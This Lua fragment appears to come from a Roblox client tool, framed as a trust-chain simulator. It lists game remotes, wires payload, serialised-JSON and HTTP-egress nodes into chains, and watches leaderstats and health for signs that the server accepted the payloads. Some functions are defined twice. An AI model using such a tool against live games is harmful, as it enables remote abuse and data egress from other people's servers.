        Enum.Font.Gotham, 8, GC.MID, Enum.TextXAlignment.Left, 42)
    -- close button
    local closeBtn = mBtn(hdr, CTX_W-20, 7, 14, 14, GC.ERR, 0.22, 42)
    mC(closeBtn, 3)
    mL(closeBtn, 0,0,14,14, "x", Enum.Font.GothamBold, 9, GC.PRI,
        Enum.TextXAlignment.Center, 43)
    closeBtn.MouseButton1Click:Connect(closeCtx)
    curY = curY + HDR_H + SEP

    -- -- SECTION: Scan sub-header (scan nodes only) ----------------
    if scanResults ~= nil then
        mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)
        local sh = mF(menu, 0, curY, CTX_W, SCAN_LBL_H, GC.CTX_BOT, 0.55, 41)
        sh.Size = UDim2.new(1,0,0,SCAN_LBL_H)
        mL(sh, 8, 0, CTX_W-80, SCAN_LBL_H,
            "FOUND IN GAME  (" .. rowCount .. ")",
            Enum.Font.GothamBold, 7, acc, Enum.TextXAlignment.Left, 42)
        mL(sh, 0, 0, CTX_W-6, SCAN_LBL_H,
            "click to refresh",
            Enum.Font.Gotham, 7, GC.DIM, Enum.TextXAlignment.Right, 42)
        curY = curY + SCAN_LBL_H + SEP
    end

    -- -- SECTION: Scrollable row list -----------------------------
    mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)

    -- ScrollingFrame containing all rows (caps at MAX_ROWS visible)
    local rowScroll = Instance.new("ScrollingFrame")
    rowScroll.Size                       = UDim2.fromOffset(CTX_W, rowAreaH)
    rowScroll.Position                   = UDim2.fromOffset(0, curY)
    rowScroll.BackgroundTransparency     = 1
    rowScroll.BorderSizePixel            = 0
    rowScroll.ScrollBarThickness         = (rowCount > MAX_ROWS) and 2 or 0
    rowScroll.ScrollBarImageColor3       = acc
    rowScroll.ScrollBarImageTransparency = 0.40
    rowScroll.CanvasSize                 = UDim2.fromOffset(CTX_W, rowCount * ROW_H)
    rowScroll.ZIndex                     = 42
    rowScroll.Parent                     = menu

    for i, act in ipairs(rowSource) do
        local ry   = (i-1) * ROW_H
        local isSel = (node.selectedAction == act) or
            (node.targetInst ~= nil and act.inst ~= nil and act.inst == node.targetInst)
        local isLiveEntry = (act.live ~= nil)

        -- Row button
        local row = mBtn(rowScroll, 0, ry, CTX_W, ROW_H,
            isSel and GC.CTX_HOT or GC.CTX_ROW,
            isSel and 0.12 or 0.70, 43)
        row.Size = UDim2.new(1, 0, 0, ROW_H)

        -- Left selection bar
        local selBar = mF(row, 0, 0, 2, ROW_H,
            isSel and acc or GC.DIV, isSel and 0.0 or 1.0, 44)
        mC(selBar, 1)

        local nameX = 8

        -- Class badge (scan results) or live dot (service)
        if scanResults ~= nil then
            local clsCol = (act.cls == "RemoteEvent" or act.cls == "BindableEvent")
                and Color3.fromRGB(100, 180, 255)
                or Color3.fromRGB(180, 130, 255)
            local cw = math.max(26, #(act.cls or "") * 5 + 6)
            local cb = mF(row, 8, (ROW_H-11)/2, cw, 11, clsCol, 0.72, 44)
            mC(cb, 3)
            mL(cb, 0,0,cw,11, act.cls or "",
                Enum.Font.GothamBold, 6, GC.PRI, Enum.TextXAlignment.Center, 45)
            nameX = cw + 12
        elseif isService and isLiveEntry then
            local isL = (act.live ~= false)
            local dot = mF(row, 8, (ROW_H-6)/2, 6, 6,
                isL and GC.CHK or GC.DIM, isL and 0.10 or 0.40, 44)
            mC(dot, 3)
            nameX = 20
        end

        -- Name label (two-line for scan results: name + path)
        if scanResults ~= nil then
            mL(row, nameX, 1, CTX_W-nameX-18, 13, act.n,
                isSel and Enum.Font.GothamBold or Enum.Font.Gotham,
                9, isSel and GC.PRI or GC.MID, Enum.TextXAlignment.Left, 44)
            if act.path then
                mL(row, nameX, 13, CTX_W-nameX-6, ROW_H-13,
                    act.path, Enum.Font.Gotham, 7, GC.DIM,
                    Enum.TextXAlignment.Left, 44)
            end
        else
            mL(row, nameX, 0, CTX_W-nameX-18, ROW_H, act.n,
                isSel and Enum.Font.GothamBold or Enum.Font.Gotham,
                9, isSel and GC.PRI or GC.MID, Enum.TextXAlignment.Left, 44)
        end

        -- Tick
        mL(row, CTX_W-16, 0, 14, ROW_H,
            isSel and "v" or "",
            Enum.Font.GothamBold, 9, acc, Enum.TextXAlignment.Center, 44)

        -- Hover
        row.MouseEnter:Connect(function()
            if not isSel then
                TweenService:Create(row, TweenInfo.new(0.08), {
                    BackgroundColor3=GC.CTX_HOT, BackgroundTransparency=0.38}):Play()
            end
        end)
        row.MouseLeave:Connect(function()
            if not isSel then
                TweenService:Create(row, TweenInfo.new(0.08), {
                    BackgroundColor3=GC.CTX_ROW, BackgroundTransparency=0.70}):Play()
            end
        end)

        -- Select
        local capturedAct = act
        row.MouseButton1Click:Connect(function()
            if scanResults ~= nil then
                node.targetInst     = capturedAct.inst
                node.selectedAction = capturedAct
            else
                node.selectedAction = capturedAct
            end
            if node.actionLbl then
                node.actionLbl.Text       = capturedAct.n
                node.actionLbl.TextColor3 = GC.MID
            end
            refreshWires()
            local pos = menu.Position
            openCtxMenu(node, Vector2.new(pos.X.Offset, pos.Y.Offset))
            -- Open the service detail panel for SERVICE nodes
            if isService and graphCanvas then
                openServiceDetailPanel(capturedAct.n, ctxMenu, graphCanvas)
            end
        end)
    end

    curY = curY + rowAreaH + SEP

    -- -- SECTION: Input box (INPUT / REQUIRE / HTTP) ---------------
    if useInputBox then
        mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)

        -- Section label
        local ibLabels = {
            INPUT   = "PAYLOAD",
            REQUIRE = "ASSET ID",
            HTTP    = "TARGET URL",
            INGRESS = "FRAMEWORK / REMOTE PATH",
            SERIAL  = "TEST PAYLOAD (JSON / STRING)",
        }
        mL(menu, 8, curY+3, CTX_W-60, 11,
            ibLabels[nodeId] or "INPUT",
            Enum.Font.GothamBold, 7, acc, Enum.TextXAlignment.Left, 42)

        -- For HTTP: GET/POST toggle sits on the label row (right side)
        if nodeId == "HTTP" then
            local mw = 28
            local methodBtn = mBtn(menu, CTX_W-mw-6, curY+2, mw, 13,
                acc, 0.55, 43)
            mC(methodBtn, 3)
            local methodLbl = mL(methodBtn, 0,0,mw,13,
                node.httpMethod or "POST",
                Enum.Font.GothamBold, 7, GC.PRI, Enum.TextXAlignment.Center, 44)
            methodBtn.MouseButton1Click:Connect(function()
                node.httpMethod = (node.httpMethod == "POST") and "GET" or "POST"
                methodLbl.Text  = node.httpMethod
            end)
        end

        -- Text box -- sits in the second row of the IB band
        local boxY = curY + 15
        local boxH = IB_H - 17
        local box  = Instance.new("TextBox")
        box.Size                  = UDim2.fromOffset(CTX_W-16, boxH)
        box.Position              = UDim2.fromOffset(8, boxY)
        box.BackgroundColor3      = GC.CTX_BOT
        box.BackgroundTransparency= 0.30
        box.BorderSizePixel       = 0
        box.Text                  = node.inputValue or ""
        box.PlaceholderText       = (nodeId=="INPUT")    and "payload string / table"
                                 or (nodeId=="REQUIRE") and "numeric AssetID"
                                 or (nodeId=="INGRESS") and "e.g. ReplicatedStorage.NetworkManager"
                                 or (nodeId=="SERIAL")  and "e.g. {\"action\":\"buy\",\"id\":1}"
                                 or "https://..."
        box.PlaceholderColor3     = GC.DIM
        box.TextColor3            = GC.PRI
        box.Font                  = Enum.Font.Code
        box.TextSize              = 9
        box.ClearTextOnFocus      = false
        box.TextXAlignment        = Enum.TextXAlignment.Left
        box.ZIndex                = 43
        box.Parent                = menu
        mC(box, 3)
        mS(box, acc, 0.45, 1)
        box.FocusLost:Connect(function() node.inputValue = box.Text end)
        box.Changed:Connect(function(p)
            if p == "Text" then node.inputValue = box.Text end
        end)

        curY = curY + IB_H + SEP
    end

    -- -- SECTION: DEFENSE band (control toggle) --------------------
    mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.45, 41).Size = UDim2.new(1,0,0,1)

    local ctrlBand = mF(menu, 0, curY, CTX_W, CTRL_H, GC.CTX_BOT, 0.35, 41)
    ctrlBand.Size  = UDim2.new(1, 0, 0, CTRL_H)

    -- "DEFENSE" tag
    mL(ctrlBand, 8, 3, 60, 11, "DEFENSE",
        Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 42)

    -- Toggle pill: ON / OFF (right side of the tag row)
    local TOG_W, TOG_H = 36, 14
    local togBg = mBtn(ctrlBand, CTX_W-TOG_W-6, 3, TOG_W, TOG_H,
        node.secured and GC.WIRE_ACT or GC.DIV,
        node.secured and 0.20 or 0.50, 42)
    mC(togBg, TOG_H/2)
    mS(togBg, node.secured and GC.WIRE_ACT or GC.DIV, 0.40, 1)

    -- Knob
    local knobX = node.secured and (TOG_W-TOG_H+2) or 2
    local knob  = mF(togBg, knobX, 2, TOG_H-4, TOG_H-4, GC.PRI, 0.0, 43)
    mC(knob, (TOG_H-4)/2)

    -- ON / OFF label left of the pill
    mL(ctrlBand, CTX_W-TOG_W-44, 3, 36, TOG_H,
        node.secured and "ON" or "OFF",
        Enum.Font.GothamBold, 7,
        node.secured and GC.WIRE_ACT or GC.DIM,
        Enum.TextXAlignment.Right, 42)

    -- Control name
    local ctrlName = ctrl and ctrl.name or "No control defined"
    mL(ctrlBand, 8, 18, CTX_W-14, 13, ctrlName,
        Enum.Font.GothamBold, 9,
        node.secured and GC.WIRE_ACT or GC.MID,
        Enum.TextXAlignment.Left, 42)

    -- Control description
    local ctrlDesc = Instance.new("TextLabel")
    ctrlDesc.Size                   = UDim2.new(1,-14,0,CTRL_H-32)
    ctrlDesc.Position               = UDim2.fromOffset(8, 32)
    ctrlDesc.BackgroundTransparency = 1
    ctrlDesc.Text                   = ctrl and ctrl.d or ""
    ctrlDesc.Font                   = Enum.Font.Gotham
    ctrlDesc.TextSize               = 8
    ctrlDesc.TextColor3             = GC.DIM
    ctrlDesc.TextXAlignment         = Enum.TextXAlignment.Left
    ctrlDesc.TextYAlignment         = Enum.TextYAlignment.Top
    ctrlDesc.TextWrapped            = true
    ctrlDesc.ZIndex                 = 42
    ctrlDesc.Parent                 = ctrlBand

    -- Toggle click
    togBg.MouseButton1Click:Connect(function()
        node.secured = not node.secured
        refreshWires()
        local pos = menu.Position
        openCtxMenu(node, Vector2.new(pos.X.Offset, pos.Y.Offset))
    end)

    curY = curY + CTRL_H + SEP

    -- -- SECTION: Footer (clear wires / delete node) ---------------
    mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.45, 41).Size = UDim2.new(1,0,0,1)

    local foot = mF(menu,0,curY,CTX_W,FOOT_H,GC.CTX_TOP,0.45,41)
    foot.Size = UDim2.new(1,0,0,FOOT_H)

    -- "Clear wires" button
    local clearBtn = mBtn(foot,6,(FOOT_H-16)/2,80,16,GC.DIV,0.40,42)
    mC(clearBtn,3)
    mL(clearBtn,0,0,80,16,"Clear Wires",Enum.Font.Gotham,8,GC.MID,Enum.TextXAlignment.Center,43)
    clearBtn.MouseButton1Click:Connect(function()
        -- Remove all wires connected to this node
        local remaining = {}
        for _, w in ipairs(graphWires) do
            if w.from == node or w.to == node then
                w.frame:Destroy()
            else
                table.insert(remaining, w)
            end
        end
        graphWires = remaining
        refreshWires()
        closeCtx()
    end)

    -- "Delete Node" button
    local delBtn = mBtn(foot,CTX_W-88,(FOOT_H-16)/2,82,16,GC.ERR,0.70,42)
    mC(delBtn,3)
    mS(delBtn,GC.ERR,0.50,1)
    mL(delBtn,0,0,82,16,"Delete Node",Enum.Font.GothamBold,8,GC.ERR,Enum.TextXAlignment.Center,43)
    delBtn.MouseButton1Click:Connect(function()
        -- Remove wires
        local remaining = {}
        for _, w in ipairs(graphWires) do
            if w.from == node or w.to == node then w.frame:Destroy()
            else table.insert(remaining, w) end
        end
        graphWires = remaining
        -- Remove from node list
        for i, n in ipairs(graphNodes) do
            if n == node then table.remove(graphNodes, i) break end
        end
        if selectedNode == node then selectedNode = nil end
        node.frame:Destroy()
        refreshWires()
        closeCtx()
    end)
end

-- -- Per-node status badge ---------------------------------------------------
-- Paints a small status label on a node during/after execution.
local function setNodeStatus(node, state, text)
    node.runState = state
    local col =
        state == "running" and GC.WARN or
        state == "success" and GC.ERR  or   -- success = attacker got through = red
        state == "severed" and GC.WIRE_ACT or
        state == "error"   and GC.DIM  or GC.DIM
    -- Lazily create a status strip pinned to the bottom of the node body
    if not node.statusLbl then
        local s = Instance.new("TextLabel")
        s.Size                 = UDim2.new(1,-12,0,10)
        s.Position             = UDim2.fromOffset(6, NODE_H-12)
        s.BackgroundTransparency = 1
        s.Font                 = Enum.Font.GothamBold
        s.TextSize             = 7
        s.TextXAlignment       = Enum.TextXAlignment.Left
        s.TextTruncate         = Enum.TextTruncate.AtEnd
        s.ZIndex               = 13
        s.Parent               = node.frame
        node.statusLbl = s
    end
    node.statusLbl.Text       = text or state
    node.statusLbl.TextColor3 = col
end

-- Verdict panel -- shown after a run completes.
local verdictPanel = nil
local function clearVerdict()
    if verdictPanel then verdictPanel:Destroy() verdictPanel = nil end
end

local function showVerdict(reached, severedAt, log)
    clearVerdict()
    local W, rowH, hdrH = 260, 16, 30
    local H = hdrH + #log * rowH + 40

    local panel = Instance.new("Frame")
    panel.Name = "Verdict"
    panel.Size = UDim2.fromOffset(W, H)
    panel.Position = UDim2.new(1, -(W+10), 0, 10)  -- top-right of canvas viewport
    panel.BackgroundColor3 = GC.CTX_TOP
    panel.BackgroundTransparency = 0.20
    panel.BorderSizePixel = 0
    panel.ZIndex = 50
    panel.Parent = graphCanvas
    mC(panel, 7)
    mGrad(panel, GC.CTX_TOP, GC.CTX_BOT, 90)
    local verdictAcc = reached and GC.ERR or GC.WIRE_ACT
    mS(panel, verdictAcc, 0.20, 1)
    mGlow(panel, verdictAcc, 0.55, 3)
    verdictPanel = panel

    -- Header
    local vh = mF(panel,0,0,W,hdrH, GC.CTX_TOP, 0.30, 51)
    vh.Size = UDim2.new(1,0,0,hdrH)
    mGrad(vh, GC.CTX_TOP, GC.CTX_BOT, 90)
    mF(vh,0,0,3,hdrH,verdictAcc,0.0,52)
    mL(vh,10,0,W-40,hdrH,
        reached and "CHAIN COMPLETE" or "CHAIN SEVERED",
        Enum.Font.GothamBold,11,verdictAcc,Enum.TextXAlignment.Left,52)

    local vClose = mBtn(vh, W-20, (hdrH-14)/2, 14, 14, GC.ERR, 0.20, 52)
    mC(vClose,3)
    mL(vClose,0,0,14,14,"x",Enum.Font.GothamBold,9,GC.PRI,Enum.TextXAlignment.Center,53)
    vClose.MouseButton1Click:Connect(clearVerdict)

    mF(panel,0,hdrH,W,1,GC.DIV,0.45,51).Size=UDim2.new(1,0,0,1)

    -- Log rows
    for i, entry in ipairs(log) do
        local ry = hdrH + 1 + (i-1)*rowH
        local rc =
            entry.status == "success" and GC.ERR or
            entry.status == "severed" and GC.WIRE_ACT or
            entry.status == "error"   and GC.WARN or GC.DIM
        mL(panel, 10, ry, 70, rowH, entry.node, Enum.Font.GothamBold, 8, rc,
            Enum.TextXAlignment.Left, 52)
        local dl = mL(panel, 82, ry, W-90, rowH, entry.detail, Enum.Font.Gotham, 8,
            GC.MID, Enum.TextXAlignment.Left, 52)
        dl.TextTruncate = Enum.TextTruncate.AtEnd
    end

    -- Verdict line
    local vy = hdrH + 1 + #log*rowH + 6
    mF(panel,0,vy-3,W,1,GC.DIV,0.45,51).Size=UDim2.new(1,0,0,1)
    local verdictText
    if reached then
        verdictText = "No controls enforced. Payload reached egress."
    else
        verdictText = "Control enforced at " .. tostring(severedAt) .. ". Downstream not reached."
    end
    local vline = mL(panel, 10, vy, W-16, 28, verdictText,
        Enum.Font.GothamBold, 8, verdictAcc, Enum.TextXAlignment.Left, 52)
    vline.TextWrapped = true
end

-- Run the chain: execute from each source, threading payload along wires,
-- stopping any path at a secured node. Animates node-by-node.
local chainRunning = false
local function runChain()
    if chainRunning then return end
    chainRunning = true
    clearVerdict()

    -- Reset all node statuses
    for _, n in ipairs(graphNodes) do
        n.runState = "idle"
        if n.statusLbl then n.statusLbl.Text = "" end
    end

    -- Build adjacency + incoming counts
    local incoming, adj = {}, {}
    for _, n in ipairs(graphNodes) do incoming[n]=0 adj[n]={} end
    for _, w in ipairs(graphWires) do
        if incoming[w.to] ~= nil then
            incoming[w.to] = incoming[w.to] + 1
            table.insert(adj[w.from], w.to)
        end
    end

    -- Find sources
    local sources = {}
    for _, n in ipairs(graphNodes) do
        if incoming[n] == 0 then table.insert(sources, n) end
    end

    local log = {}
    local reachedEgress = false
    local severedAt = nil

    -- DFS execution along each path (handles linear + branching chains)
    local visited = {}
    local function walk(node, payload)
        if visited[node] then return end
        visited[node] = true

        -- Secured node severs the path here
        if node.secured then
            setNodeStatus(node, "severed", "SECURED")
            table.insert(log, { node=node.typeData.id, status="severed",
                detail="control enforced -- chain severed" })
            severedAt = node.typeData.label
            return
        end

        setNodeStatus(node, "running", "running...")
        task.wait(0.18)

        local ok, output, detail = executeNode(node, payload)
        if ok then
            setNodeStatus(node, "success", detail)
            table.insert(log, { node=node.typeData.id, status="success", detail=detail })
            if node.typeData.id == "HTTP" then reachedEgress = true end
            -- propagate to downstream nodes
            for _, nxt in ipairs(adj[node]) do
                walk(nxt, output)
            end
        else
            setNodeStatus(node, "error", detail)
            table.insert(log, { node=node.typeData.id, status="error", detail=detail })
        end
    end

    task.spawn(function()
        for _, s in ipairs(sources) do
            walk(s, nil)
        end
        showVerdict(reachedEgress, severedAt, log)
        chainRunning = false
    end)
end

-- -- Node factory -----------------------------------------------------------
local nodeSerial = 0
local function spawnNode(typeData, cx, cy)
    nodeSerial = nodeSerial + 1
    local acc = ROLE_ACC[typeData.role]

    -- Snap to grid
    cx = math.floor(cx / SNAP) * SNAP
    cy = math.floor(cy / SNAP) * SNAP

    -- -- Glass node body: translucent fill + vertical gradient --
    local nf = mF(graphCanvas, cx, cy, NODE_W, NODE_H,
        GC.NODE_TOP, 0.42, 10)   -- high transparency = game shows through
    nf.Name = "Node_" .. nodeSerial
    mC(nf, 7)
    mGrad(nf, GC.NODE_TOP, GC.NODE_BOT, 90)
    -- thin inner border + accent-tinted outer glow
    mS(nf, acc, 0.55, 1)
    local nodeGlow = mGlow(nf, acc, 0.80, 2)

    -- Selection brackets (hidden until selected) -- four corner Ls
    local selRing = mF(nf, 0, 0, NODE_W, NODE_H, Color3.new(0,0,0), 1, 14)
    selRing.Size = UDim2.new(1,0,1,0)
    selRing.Name = "SelRing"
    local brColor = GC.SEL_RING
    local brTrans = 1   -- start invisible
    local brackets = {}
    for _, cnr in ipairs({"TL","TR","BL","BR"}) do
        local h, v = mBracket(selRing, cnr, 12, 2, brColor, brTrans, 15)
        table.insert(brackets, h)
        table.insert(brackets, v)
    end

    -- -- Header: gradient bar with frosted feel --
    local hdr = mF(nf, 0, 0, NODE_W, HDR_H, GC.NODE_HDR1, 0.25, 11)
    hdr.Size = UDim2.new(1,0,0,HDR_H)
    mC(hdr,7)
    mGrad(hdr, GC.NODE_HDR1, GC.NODE_HDR2, 90)
    -- square off header bottom corners
    local hsq = mF(hdr,0,HDR_H-6,NODE_W,6,GC.NODE_HDR2,0.30,11)
    hsq.Size = UDim2.new(1,0,0,6)

    -- Accent left stripe (glowing)
    local stripe = mF(hdr, 0, 0, 3, HDR_H, acc, 0.0, 12)
    mGlow(stripe, acc, 0.55, 2)

    -- Thin accent underline beneath header
    local hline = mF(nf, 3, HDR_H, NODE_W-3, 1, acc, 0.55, 12)
    hline.Size = UDim2.new(1,-3,0,1)

    -- Role badge (glass pill)
    local badgeW = math.max(38, #typeData.id * 6 + 10)
    local badge = mF(hdr, NODE_W - badgeW - 5, (HDR_H-13)/2, badgeW, 13, acc, 0.55, 12)
    mC(badge,4)
    mS(badge, acc, 0.30, 1)
    mL(badge,0,0,badgeW,13,typeData.id,Enum.Font.GothamBold,7,GC.PRI,Enum.TextXAlignment.Center,13)

    -- Lock glyph (shown only when this node's control is secured)
    local lockGlyph = mL(hdr, NODE_W - badgeW - 20, 0, 14, HDR_H, "[L]",
        Enum.Font.GothamBold, 9, GC.WIRE_ACT, Enum.TextXAlignment.Center, 13)
    lockGlyph.TextTransparency = 1   -- hidden until secured

    -- Node title
    mL(hdr, 9, 0, NODE_W - badgeW - 34, HDR_H, typeData.label,
        Enum.Font.GothamBold, 10, GC.PRI, Enum.TextXAlignment.Left, 12)

    -- Action label (body)
    local actionLbl = mL(nf, 9, HDR_H+4, NODE_W-18, NODE_H-HDR_H-8,
        "Right-click to configure",
        Enum.Font.Gotham, 9, GC.DIM, Enum.TextXAlignment.Left, 11)
    actionLbl.TextWrapped = true

    -- -- Input port: glowing ring with hollow centre --
    local inPort = mF(nf, -PORT_R, (NODE_H-PORT_R*2)/2, PORT_R*2, PORT_R*2,
        GC.PORT_IN, 0.20, 13)
    mC(inPort, PORT_R)
    mS(inPort, GC.PORT_IN, 0.0, 2)
    mGlow(inPort, GC.PORT_IN, 0.55, 3)
    -- hollow centre dot
    local inDot = mF(inPort, PORT_R-2, PORT_R-2, 4, 4, GC.CANVAS, 0.30, 14)
    mC(inDot, 2)

    -- -- Output port: solid glowing node --
    local outPort = mF(nf, NODE_W-PORT_R, (NODE_H-PORT_R*2)/2, PORT_R*2, PORT_R*2,
        GC.PORT_OUT, 0.0, 13)
    mC(outPort, PORT_R)
    mS(outPort, GC.PORT_OUT, 0.0, 2)
    mGlow(outPort, GC.PORT_OUT, 0.55, 3)

    local node = {
        frame          = nf,
        selRing        = selRing,
        brackets       = brackets,
        typeData       = typeData,
        selectedAction = nil,
        actionLbl      = actionLbl,
        inPort         = inPort,
        outPort        = outPort,
        serial         = nodeSerial,
        -- trust-propagation state
        secured        = false,        -- control toggle OFF by default
        accentStripe   = stripe,       -- header left stripe (recoloured by state)
        lockGlyph      = lockGlyph,    -- lock shown when secured
        stateGlow      = nodeGlow,     -- outer glow recoloured by state
        -- execution state
        inputValue     = nil,          -- text payload / AssetID / URL (input-box nodes)
        httpMethod     = "POST",        -- GET or POST for HTTP nodes
        targetInst     = nil,          -- live Instance picked from a scan (remote/bindable)
        statusLbl      = nil,          -- per-node run status label (set on first run)
        runState       = "idle",       -- idle | running | success | error | severed
    }
    table.insert(graphNodes, node)

    -- -- Drag logic ---------------------------------------------
    local dragActive = false
    local dragOX, dragOY = 0, 0
    local wasDragged = false

    -- screenToCanvas: converts an absolute screen position into canvas-local
    -- coordinates accounting for the canvas element position and scroll offset.
    local function screenToCanvas(sx, sy)
        local ca = graphCanvas.AbsolutePosition
        local cp = graphCanvas.CanvasPosition
        return sx - ca.X + cp.X, sy - ca.Y + cp.Y
    end

    nf.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            selectNode(node)
            closeCtx()
            dragActive = true
            wasDragged = false
            -- Record click offset in canvas space so node doesn't jump on first move
            local cx, cy = screenToCanvas(inp.Position.X, inp.Position.Y)
            dragOX = cx - nf.Position.X.Offset
            dragOY = cy - nf.Position.Y.Offset
        end
    end)
    nf.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragActive = false
        end
    end)
    UserInputService.InputChanged:Connect(function(inp)
        if not dragActive then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
        -- Convert current mouse position to canvas space, subtract stored offset
        local cx, cy = screenToCanvas(inp.Position.X, inp.Position.Y)
        local newX = math.floor((cx - dragOX) / SNAP) * SNAP
        local newY = math.floor((cy - dragOY) / SNAP) * SNAP
        nf.Position = UDim2.fromOffset(newX, newY)
        wasDragged = true
        refreshWires()
    end)

    -- -- Right-click: open context menu -------------------------
    nf.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton2 then
            local mx, my = screenToCanvas(inp.Position.X, inp.Position.Y)
            openCtxMenu(node, Vector2.new(mx, my))
        end
    end)

    -- -- Output port click: start wiring ------------------------
    local outBtn = mBtn(outPort, 0, 0, PORT_R*2, PORT_R*2, Color3.new(0,0,0), 1, 14)
    outBtn.MouseButton1Click:Connect(function()
        if wiringFrom and wiringFrom ~= node then
            -- Complete wire: wiringFrom -> this node
            -- Prevent duplicate wires
            local dup = false
            for _, w in ipairs(graphWires) do
                if w.from == wiringFrom and w.to == node then dup=true break end
            end
            if not dup and wiringFrom ~= node then
                local wf = makeWire()
                local wireObj = { from=wiringFrom, to=node, frame=wf }
                table.insert(graphWires, wireObj)
                local p1 = getPortPos(wiringFrom, true)
                local p2 = getPortPos(node, false)
                drawWireLine(wf, p1, p2)
                refreshWires()
            end
            -- Reset wiring state + dim previous source
            if wiringFrom.outPort then
                wiringFrom.outPort.BackgroundTransparency = 0.0
            end
            wiringFrom = nil
        else
            -- Begin wiring from this node
            wiringFrom = node
            TweenService:Create(outPort, TweenInfo.new(0.15), {
                BackgroundTransparency = 0.60,
            }):Play()
        end
    end)

    -- -- Input port click: cancel wiring ------------------------
    local inBtn = mBtn(inPort, 0, 0, PORT_R*2, PORT_R*2, Color3.new(0,0,0), 1, 14)
    inBtn.MouseButton1Click:Connect(function()
        if wiringFrom and wiringFrom ~= node then
            local dup = false
            for _, w in ipairs(graphWires) do
                if w.from == wiringFrom and w.to == node then dup=true break end
            end
            if not dup then
                local wf = makeWire()
                table.insert(graphWires, { from=wiringFrom, to=node, frame=wf })
                local p1 = getPortPos(wiringFrom, true)
                local p2 = getPortPos(node, false)
                drawWireLine(wf, p1, p2)
                refreshWires()
            end
            if wiringFrom.outPort then wiringFrom.outPort.BackgroundTransparency = 0.0 end
            wiringFrom = nil
        end
    end)

    return node
end

-- -- Page builder -----------------------------------------------------------
-- --- CHAIN EXECUTION ENGINE -------------------------------------------------
-- executeChain() walks the wire graph in topological order and runs each
-- node's configured action with real Roblox API calls.
-- Each node shows a live status label; a verdict panel appears at the end.

local verdictFrame = nil   -- canvas-level verdict panel (one at a time)

local function clearVerdict()
    if verdictFrame then verdictFrame:Destroy() verdictFrame = nil end
end

local function setNodeRunState(node, state, msg)
    -- state: "idle" | "running" | "success" | "error" | "severed"
    node.runState = state
    local col = state == "running" and GC.WARN
             or state == "success" and GC.CHK
             or state == "error"   and GC.ERR
             or state == "severed" and GC.DIV
             or GC.DIM
    if not node.statusLbl then
        -- Create a status label in the bottom-right of the node body
        local lbl = Instance.new("TextLabel")
        lbl.Size                = UDim2.fromOffset(NODE_W - 18, 11)
        lbl.Position            = UDim2.fromOffset(9, NODE_H - 13)
        lbl.BackgroundTransparency = 1
        lbl.Font                = Enum.Font.GothamBold
        lbl.TextSize            = 8
        lbl.TextXAlignment      = Enum.TextXAlignment.Right
        lbl.ZIndex              = 15
        lbl.Parent              = node.frame
        node.statusLbl          = lbl
    end
    node.statusLbl.TextColor3 = col
    node.statusLbl.Text       = msg or state:upper()
    -- Pulse the node glow to match state
    if node.stateGlow and state ~= "idle" then
        TweenService:Create(node.stateGlow, TweenInfo.new(0.18), {
            Color = col, Transparency = 0.30,
        }):Play()
    end
end

local function resetAllNodeStates()
    for _, n in ipairs(graphNodes) do
        setNodeRunState(n, "idle", "")
    end
    refreshWires()
end

-- Topological sort (Kahn's algorithm).
-- Returns ordered list of nodes, or nil if a cycle is detected.
local function topoSort()
    local inDeg = {}
    local adj   = {}
    for _, n in ipairs(graphNodes) do inDeg[n] = 0 adj[n] = {} end
    for _, w in ipairs(graphWires) do
        if inDeg[w.to] ~= nil then
            inDeg[w.to] = inDeg[w.to] + 1
            table.insert(adj[w.from], w.to)
        end
    end
    local queue, order = {}, {}
    for _, n in ipairs(graphNodes) do
        if inDeg[n] == 0 then table.insert(queue, n) end
    end
    while #queue > 0 do
        local cur = table.remove(queue, 1)
        table.insert(order, cur)
        for _, nxt in ipairs(adj[cur]) do
            inDeg[nxt] = inDeg[nxt] - 1
            if inDeg[nxt] == 0 then table.insert(queue, nxt) end
        end
    end
    if #order ~= #graphNodes then return nil end  -- cycle
    return order
end

-- Show the verdict panel at the bottom-right of the canvas.

-- --- SERVER RESPONSE MONITOR -------------------------------------------------
-- Observes client-visible state changes after the chain fires to determine
-- whether the server accepted, processed, or silently dropped the payload.
--
-- Observable signals (all client-accessible without server cooperation):
--   1. RemoteFunction return value        -> direct server acknowledgement
--   2. OnClientEvent callbacks            -> server fired back to us
--   3. Player attribute changes           -> server modified player state
--   4. Leaderstats value changes          -> economy / score modified
--   5. Character attribute / health delta -> combat or damage processed
--   6. ReplicatedStorage structural change -> server added/removed objects
--
-- Verdict states:
--   ACCEPTED  -- observable change detected or RemoteFunction returned data
--   CALLBACK  -- server fired OnClientEvent back within the observation window
--   SILENT    -- chain ran without error but nothing observable changed
--   REJECTED  -- pcall caught a server-side error
--   TIMEOUT   -- observation window closed with no signal

local SRM_OBSERVATION_WINDOW = 2.0   -- seconds to watch for server response

-- Snapshot all observable client-side state
local function srmSnapshot()
    local snap = {
        playerAttrs   = {},
        leaderstats   = {},
        charHealth    = nil,
        charAttrs     = {},
        repStorageKeys= {},
        playerGuiKeys = {},
    }
    local plr = game:GetService("Players").LocalPlayer

    -- Player attributes
    local ok1, attrs = pcall(function() return plr:GetAttributes() end)
    if ok1 and attrs then
        for k, v in pairs(attrs) do snap.playerAttrs[k] = tostring(v) end
    end

    -- Leaderstats
    local ls = plr:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v:IsA("ValueBase") then
                snap.leaderstats[v.Name] = tostring(v.Value)
            end
        end
    end

    -- Character
    local char = plr.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then snap.charHealth = hum.Health end
        local ok2, ca = pcall(function() return char:GetAttributes() end)
        if ok2 and ca then
            for k, v in pairs(ca) do snap.charAttrs[k] = tostring(v) end
        end
    end

    -- ReplicatedStorage top-level keys
